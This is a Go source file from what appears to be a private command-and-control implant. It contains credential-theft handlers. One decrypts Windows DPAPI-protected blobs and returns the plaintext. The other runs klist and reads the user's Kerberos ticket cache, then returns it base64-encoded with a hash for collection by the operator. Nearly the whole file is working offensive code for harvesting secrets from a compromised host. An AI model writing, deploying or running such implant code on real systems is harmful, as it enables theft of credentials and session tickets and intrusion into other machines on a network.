package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"github.com/azizbinmohammad/private-c2/implant/modules/credential"
)

const (
	maxDPAPIBlob   = 4 << 20
	maxCCacheBytes = 4 << 20
)

func handleCredentialDPAPI(_ context.Context, args string) (string, error) {
	var req struct {
		Data    string `json:"data"`
		Entropy string `json:"entropy,omitempty"`
		Machine bool   `json:"machine,omitempty"`
	}
	if err := unmarshalArgs(args, &req); err != nil {
		return "", fmt.Errorf("credential_dpapi args must be JSON: %w", err)
	}
	if req.Data == "" {
		return "", fmt.Errorf("credential_dpapi requires base64 data")
	}
	blob, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return "", fmt.Errorf("data must be base64: %w", err)
	}
	if len(blob) > maxDPAPIBlob {
		return "", fmt.Errorf("DPAPI blob exceeds the %d-byte limit", maxDPAPIBlob)
	}
	var entropy []byte
	if req.Entropy != "" {
		entropy, err = base64.StdEncoding.DecodeString(req.Entropy)
		if err != nil {
			return "", fmt.Errorf("entropy must be base64: %w", err)
		}
	}
	plain, err := credential.UnprotectDPAPI(blob, entropy, req.Machine)
	if err != nil {
		return "", err
	}
	sum := sha256.Sum256(plain)
	return marshalJSON(map[string]any{
		"size":   len(plain),
		"sha256": hex.EncodeToString(sum[:]),
		"data":   base64.StdEncoding.EncodeToString(plain),
	})
}

// handleCredentialKerberos lists tickets with klist and captures the local
// credential cache when one exists. It does not use LSA APIs.
func handleCredentialKerberos(ctx context.Context, _ string) (string, error) {
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	result := map[string]any{
		"klist":         "",
		"ccache_path":   "",
		"ccache_size":   0,
		"ccache_sha256": "",
		"ccache_data":   "",
	}

	if path, err := exec.LookPath("klist"); err == nil {
		out, runErr := exec.CommandContext(ctx, path).CombinedOutput()
		if len(out) > 64<<10 {
			out = out[:64<<10]
		}
		result["klist"] = string(out)
		if runErr != nil {
			result["klist_error"] = runErr.Error()
		}
	} else {
		result["klist_error"] = "klist is not installed"
	}

	ccache := ccachePath()
	if ccache == "" {
		return marshalJSON(result)
	}
	info, err := os.Stat(ccache)
	if err != nil || !info.Mode().IsRegular() || info.Size() > maxCCacheBytes {
		return marshalJSON(result)
	}
	data, err := os.ReadFile(ccache)
	if err != nil {
		return marshalJSON(result)
	}
	sum := sha256.Sum256(data)
	result["ccache_path"] = ccache
	result["ccache_size"] = len(data)
	result["ccache_sha256"] = hex.EncodeToString(sum[:])
	result["ccache_data"] = base64.StdEncoding.EncodeToString(data)
	return marshalJSON(result)
}

func ccachePath() string {
	if name := strings.TrimPrefix(os.Getenv("KRB5CCNAME"), "FILE:"); name != "" {
		if info, err := os.Stat(name); err == nil && info.Mode().IsRegular() {
			return name
		}
	}
	if current, err := user.Current(); err == nil {
		candidate := filepath.Join(os.TempDir(), "krb5cc_"+current.Uid)
		if info, err := os.Stat(candidate); err == nil && info.Mode().IsRegular() {
			return candidate
		}
	}
	return ""
}
